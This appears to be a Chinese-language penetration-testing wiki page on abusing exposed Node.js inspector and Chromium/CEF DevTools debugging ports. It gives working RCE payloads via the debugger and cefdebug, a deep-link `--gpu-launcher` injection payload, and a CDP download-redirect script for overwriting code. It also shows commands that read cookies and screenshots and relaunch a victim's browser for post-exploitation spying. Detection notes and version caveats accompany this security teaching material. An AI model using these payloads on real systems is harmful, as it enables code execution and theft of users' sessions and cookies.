# Node inspector/CEF 调试滥用

{{#include ../../banners/hacktricks-training.md}}

历史上的实际案例包括 Multimaster walkthrough 和 CVE-2019-1414 Visual Studio Code debugger attack；应将它们作为特定版本的背景信息，而不要假设所有当前的 Electron 或 Chromium 目标都具有相同的原语。<sup>[[1]](#references)[[3]](#references)</sup>

## 基本信息

[来自文档](https://nodejs.org/learn/getting-started/debugging)：使用 `--inspect` 开关启动时，Node.js 进程会监听调试客户端。**默认情况下**，它会监听主机和端口 **`127.0.0.1:9229`**。每个进程还会分配一个**唯一**的 **UUID**。<sup>[[4]](#references)</sup>

Inspector 客户端必须知道并指定主机地址、端口和 UUID 才能连接。完整 URL 类似于 `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`。<sup>[[4]](#references)</sup>

> [!WARNING]
> 由于 **debugger 可以完全访问 Node.js 执行环境**，能够连接到此端口的恶意行为者可能可以代表 Node.js 进程执行任意代码（**潜在的权限提升**）。<sup>[[4]](#references)</sup>

启动 inspector 有以下几种方式：<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

当你启动一个经过检查的进程时，会出现类似这样的内容：<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

基于 **CEF**（**Chromium Embedded Framework**）的进程可以通过 `--remote-debugging-port=9222` 暴露 debugger。它通过 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 暴露浏览器，而不是 Node.js inspector，因此默认情况下不能直接使用基于 Node.js `process` 的 payload。<sup>[[2]](#references)[[5]](#references)</sup>

启动启用了调试功能的浏览器时，会出现类似以下内容：<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### 枚举并驱动 CDP endpoint

HTTP 发现 endpoints 会区分 **浏览器** WebSocket 与各个 **目标**（标签页、worker、扩展程序等）的 WebSocket。查询 `/json/version` 获取浏览器 endpoint，查询 `/json/list` 获取 targets；随后可以使用 CDP 的类 JSON-RPC 消息直接驱动返回的 `webSocketDebuggerUrl` 值。<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

例如，使用 `websocat "$BROWSER_WS"` 连接并发送 `{"id":1,"method":"Target.getTargets"}` 或 `{"id":2,"method":"Storage.getCookies"}`。在页面 target 上（`websocat "$PAGE_WS"`），`Runtime.evaluate` 会在该渲染进程中执行，而 `Page.captureScreenshot` 会返回 base64 编码的截图。`document.cookie` 无法读取 `HttpOnly` cookie，而 `Storage.getCookies` 会向浏览器请求其 cookie 存储区。<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### 浏览器、WebSocket 和同源策略 <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

在浏览器中打开的网站可以在浏览器安全模型下发起 WebSocket 和 HTTP 请求。**初始 HTTP 连接**是**获取唯一调试器会话 ID**所必需的。**同源策略**会**阻止**网站建立**此 HTTP 连接**。为了进一步防御 [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**，**Node.js 会验证连接的 **'Host' headers** 是否明确指定了一个 **IP 地址**或 **`localhost`**。<sup>[[4]](#references)</sup>

> [!TIP]
> 这些**安全措施可防止攻击者仅通过发送 HTTP 请求来利用 inspector 执行代码**（例如利用 SSRF 漏洞发起请求）。<sup>[[4]](#references)</sup>

### 在运行中的进程里启动 inspector

你可以向正在运行的 nodejs 进程发送 **signal SIGUSR1**，使其在默认端口启动 **inspector**。但请注意，你需要具备足够的权限。因此，这可能会让你**获得对进程内信息的特权访问权限**，但不会直接导致权限提升。<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> 这在容器中很有用，因为**关闭进程并使用 `--inspect` 启动新进程**是**不可行的**，因为**容器**会随进程一起被**终止**。<sup>[[6]](#references)</sup>

### 连接到 inspector/debugger

要连接到**基于 Chromium 的浏览器**，可以分别访问 Chrome 或 Edge 的 `chrome://inspect` 或 `edge://inspect` URL。点击 Configure 按钮后，应确保已正确列出**目标主机和端口**。图中展示了一个 Remote Code Execution (RCE) 示例：<sup>[[2]](#references)[[4]](#references)</sup>

![访问 debugger 的 URL 随后会显示。例如 ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - 连接到 inspector/debugger：要连接到基于 Chromium 的浏览器，...](<../../images/image (674).png>)

使用**命令行**可以连接到 debugger/inspector：<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

工具 [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) 可用于**查找**本地运行的 **inspectors**，并向其中**注入代码**。<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> 请注意，如果通过 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 连接到浏览器，**NodeJS RCE exploits 将无法生效**（你需要查看 API，找出可以利用它做的有趣事情）。<sup>[[2]](#references)[[5]](#references)</sup>

## NodeJS Debugger/Inspector 中的 RCE

> [!TIP]
> 如果你来这里是想了解如何[**通过 Electron 中的 XSS 获取 RCE，请查看此页面。**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

当你可以**连接**到 Node **inspector** 时，获取 **RCE** 的一些常见方法包括使用类似以下的方式（看起来这在连接到 Chrome DevTools protocol 时**不起作用**）：<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocol 载荷

你可以在这里查看 API：[https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)。<sup>[[5]](#references)</sup>
本节仅列出我发现有人曾利用此协议实施攻击的一些有趣方法。

### Chrome 136+ 默认配置文件限制

从 **Chrome 136** 开始，如果 `--remote-debugging-port` 和 `--remote-debugging-pipe` 指向**默认 Chrome 数据目录**，Chrome 会忽略这些参数。必须将这些开关与非标准的 `--user-data-dir` 配合使用；其独立的加密密钥和隔离的浏览器状态可防止通过简单的基于标志的技术暴露用户经过身份验证的常规配置文件。未经验证，不应假定此 Chrome 特有限制也适用于旧版 Chrome、Chrome for Testing、Electron/CEF 应用或其他 Chromium 衍生版本。<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

因此，仅看到当前 Chrome 进程通过 `--remote-debugging-port` 启动，**并不能**证明 CDP 已激活。请确认监听器和 `/json/version`，并确定实际为其提供支持的是哪个 profile。<sup>[[14]](#references)</sup>

### 通过 Deep Links 注入参数

在 [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) 中，Rhino security 发现，一个基于 CEF 的应用在系统中**注册了一个自定义 URI**（workspaces://index.html），该 URI 接收完整的 URI，然后**启动基于 CEF 的应用**，其配置部分由该 URI 构造而成。<sup>[[8]](#references)</sup>

研究人员发现，URI 参数会经过 URL 解码，然后用于启动基于 CEF 的应用，因此用户可以在**命令行**中**注入**标志 **`--gpu-launcher`** 并执行任意操作。<sup>[[8]](#references)</sup>

因此，类似这样的 payload：

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

将执行 calc.exe。<sup>[[8]](#references)</sup>

### 覆盖文件

更改**下载文件的保存目录**，并下载文件以使用你的**恶意代码**覆盖应用程序中经常使用的**源代码**。<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE 与数据外传

STAR Labs 展示了暴露的 WebDriver/CDP 服务可导致任意文件读取和 RCE；在某些配置中，DNS rebinding 可以完成整个 exploit chain。<sup>[[9]](#references)</sup>

ChromeDriver 的 WebDriver 服务与 Chrome DevTools/CDP 不同。它的 [`goog:chromeOptions.binary` capability](https://developer.chrome.com/docs/chromedriver/capabilities) 用于指定新 session 启动的 browser executable。如果无特权调用者能够访问以 root 身份运行的 ChromeDriver 服务，并提交一个使用调用者可控 executable path 的 session，那么启动过程就可能跨越服务的权限边界。`/sessions` 返回空结果，并不能确定是否可以创建新 session。在判断该路径是否可用之前，应检查进程所有者、实际 listener 的可达性、session 授权、executable 访问权限和限制措施；仅凭进程名称或常见端口不足以得出结论。[Google 的 security guidance](https://developer.chrome.com/docs/chromedriver/security-considerations) 建议在无特权账户下运行 ChromeDriver。被动枚举不应创建 WebDriver session。

如需了解更多历史上的 browser-automation 和 Chromium security 案例，请参阅 Counter WebDriver write-up 以及 Project Zero issues 773、1742 和 1944。<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### 在运行中的 Chromium 进程内启用 CDP

在 Windows 上，[**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) 展示了命令行限制并非启用 CDP 的唯一方式：能够向现有 `msedge.exe` 注入代码的代码，可以调用 Chromium 未导出的 `content::DevToolsAgentHost::StartRemoteDebuggingServer`，无需重启 browser 即可暴露经过身份验证的实时 profile。<sup>[[15]](#references)</sup>

演示的 chain 使用 `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread` 注入 DLL，解析 Edge 内部 symbols（先从 PDBs 中解析，再使用特定版本的 byte signatures），对 browser window 进行 subclass，并发送一条 message，使最终的 server-start 调用在 browser **UI thread** 上执行。socket 绑定到 loopback 后，即可使用常规 CDP primitives 获取 cookies、捕获 tabs、检查 network traffic，或在已通过身份验证的页面中执行 JavaScript。<sup>[[15]](#references)</sup>

> [!WARNING]
> 这是一种 **post-compromise/process-injection** 技术，而非未认证的 network bypass。它高度依赖具体 build，因为相关的 C++ symbols 未导出，且 signatures 可能在 browser 更新后发生变化。<sup>[[15]](#references)</sup>

进行检测时，不要只依赖 `--remote-debugging-*` command-line telemetry：还应关联针对 browser 进程的异常 handles 和内存操作（`PROCESS_VM_OPERATION`、`PROCESS_VM_WRITE`、thread creation）、DLL injection，以及由 Chrome/Edge 持有的意外 loopback listening sockets。<sup>[[15]](#references)</sup>

### Post-Exploitation

在真实环境中，**compromising** 一台使用 Chromium-based browser 的用户 PC 后，历史上曾有一种技术是重新启动 browser 并启用 debugging，再转发 loopback 端口。在仍接受所选 profile 的产品/build 上，这可能暴露受害者的 browsing state；但 Chrome 136+ 不会对其默认 data directory 接受此操作。<sup>[[7]](#references)[[14]](#references)</sup>

下方保留了供较旧或特定版本目标使用的原始重新启动命令。第二条命令是当前 Chrome 支持的形式，但它会创建隔离的 profile，而不会重新打开受害者通常使用的、已通过身份验证的 state。<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

对于 macOS 专属的 Chromium relaunch、extension 和 CDP tradecraft，请参阅 [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md)。



## References

- [1] [HackTheBox - Multimaster（IppSec）](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium 调试器检查与利用工具](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414：通过 Chrome DevTools Debugger 实现 Visual Studio Code 远程代码执行](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js 调试指南 - 入门](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme（Larry Yuan）](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation：滥用 Chrome 调试功能远程查看和控制浏览会话](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112：AWS WorkSpaces 远程代码执行](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [你在和我说话吗？- 通过 DNS Rebinding 和 CDP 实现 WebDriver RCE（STAR Labs）](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - 从 Bot 到 RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773（Chromium bug tracker）](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742（Chromium bug tracker）](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944（Chromium bug tracker）](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [改进安全性的远程调试开关变更 - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [向运行中的 Edge 浏览器注入 CDP：深入了解运行时浏览器插桩](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
